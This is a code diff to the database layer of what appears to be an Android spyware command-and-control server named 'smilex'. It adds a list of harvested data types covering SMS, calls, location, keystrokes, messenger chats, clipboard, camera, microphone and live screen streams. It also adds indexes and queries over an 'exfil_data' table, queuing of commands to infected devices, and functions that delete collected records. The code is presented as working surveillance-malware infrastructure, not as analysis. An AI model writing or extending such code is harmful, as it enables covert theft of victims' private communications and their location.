@@ -5,6 +5,19 @@ from datetime import datetime
 
 DB_PATH = os.environ.get("DB_PATH", "smilex.db")
 
+# All known data types (for filtering in dashboard)
+DATA_TYPES = [
+    "sms", "call", "location", "contact", "notification",
+    "accessibility", "keylog",
+    "im", "im_whatsapp", "im_telegram", "im_instagram",
+    "im_facebook", "im_viber", "im_skype", "im_vk",
+    "im_gmail", "im_deepseek", "im_grok",
+    "calendar", "browser_history", "browser_url",
+    "app_usage", "device_info", "files", "clipboard",
+    "screencap", "camera", "audio", "livestream",
+    "battery", "sim", "network",
+]
+
 def get_db():
     conn = sqlite3.connect(DB_PATH)
     conn.row_factory = sqlite3.Row
@@ -45,6 +58,10 @@ def init_db():
             frame_data TEXT,
             created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         );
+        CREATE INDEX IF NOT EXISTS idx_exfil_device ON exfil_data(device_id);
+        CREATE INDEX IF NOT EXISTS idx_exfil_type ON exfil_data(data_type);
+        CREATE INDEX IF NOT EXISTS idx_commands_device ON commands(device_id);
+        CREATE INDEX IF NOT EXISTS idx_commands_status ON commands(status);
     """)
     conn.commit()
     conn.close()
@@ -55,7 +72,10 @@ def register_device(device_id, model=None, android_version=None):
     c.execute("""
         INSERT INTO devices (device_id, model, android_version)
         VALUES (?, ?, ?)
-        ON CONFLICT(device_id) DO UPDATE SET last_seen=CURRENT_TIMESTAMP
+        ON CONFLICT(device_id) DO UPDATE SET
+            last_seen=CURRENT_TIMESTAMP,
+            model=COALESCE(excluded.model, model),
+            android_version=COALESCE(excluded.android_version, android_version)
     """, (device_id, model, android_version))
     conn.commit()
     conn.close()
@@ -63,8 +83,10 @@ def register_device(device_id, model=None, android_version=None):
 def store_exfil(device_id, data_type, payload=None, filename=None):
     conn = get_db()
     c = conn.cursor()
-    c.execute("INSERT INTO exfil_data (device_id, data_type, payload, filename) VALUES (?, ?, ?, ?)",
-              (device_id, data_type, payload, filename))
+    c.execute(
+        "INSERT INTO exfil_data (device_id, data_type, payload, filename) VALUES (?, ?, ?, ?)",
+        (device_id, data_type, payload, filename)
+    )
     conn.commit()
     conn.close()
 
@@ -79,12 +101,16 @@ def queue_command(device_id, cmd, args=None):
 def get_pending_commands(device_id):
     conn = get_db()
     c = conn.cursor()
-    c.execute("SELECT * FROM commands WHERE device_id=? AND status='pending' ORDER BY created_at ASC",
-              (device_id,))
+    c.execute(
+        "SELECT * FROM commands WHERE device_id=? AND status='pending' ORDER BY created_at ASC",
+        (device_id,)
+    )
     rows = c.fetchall()
     for row in rows:
-        c.execute("UPDATE commands SET status='sent', executed_at=CURRENT_TIMESTAMP WHERE id=?",
-                  (row['id'],))
+        c.execute(
+            "UPDATE commands SET status='sent', executed_at=CURRENT_TIMESTAMP WHERE id=?",
+            (row['id'],)
+        )
     conn.commit()
     result = [dict(r) for r in rows]
     conn.close()
@@ -116,6 +142,20 @@ def get_exfil_data(device_id=None, data_type=None, limit=100):
     conn.close()
     return result
 
+def get_exfil_by_types(device_id, types, limit=50):
+    """Get exfil data filtered to a list of data_types."""
+    conn = get_db()
+    c = conn.cursor()
+    placeholders = ",".join("?" * len(types))
+    query = (
+        f"SELECT * FROM exfil_data WHERE device_id=? AND data_type IN ({placeholders})"
+        f" ORDER BY created_at DESC LIMIT ?"
+    )
+    c.execute(query, [device_id] + list(types) + [limit])
+    result = [dict(r) for r in c.fetchall()]
+    conn.close()
+    return result
+
 def get_all_commands(device_id=None, limit=100):
     conn = get_db()
     c = conn.cursor()
@@ -143,5 +183,24 @@ def get_stats():
     stats['total_commands'] = c.fetchone()[0]
     c.execute("SELECT COUNT(*) FROM commands WHERE status='pending'")
     stats['pending_commands'] = c.fetchone()[0]
+    # Per-type counts
+    c.execute(
+        "SELECT data_type, COUNT(*) as cnt FROM exfil_data GROUP BY data_type ORDER BY cnt DESC"
+    )
+    stats['type_counts'] = {row[0]: row[1] for row in c.fetchall()}
     conn.close()
     return stats
+
+def delete_exfil(record_id):
+    conn = get_db()
+    c = conn.cursor()
+    c.execute("DELETE FROM exfil_data WHERE id=?", (record_id,))
+    conn.commit()
+    conn.close()
+
+def delete_all_exfil_for_device(device_id):
+    conn = get_db()
+    c = conn.cursor()
+    c.execute("DELETE FROM exfil_data WHERE device_id=?", (device_id,))
+    conn.commit()
+    conn.close()
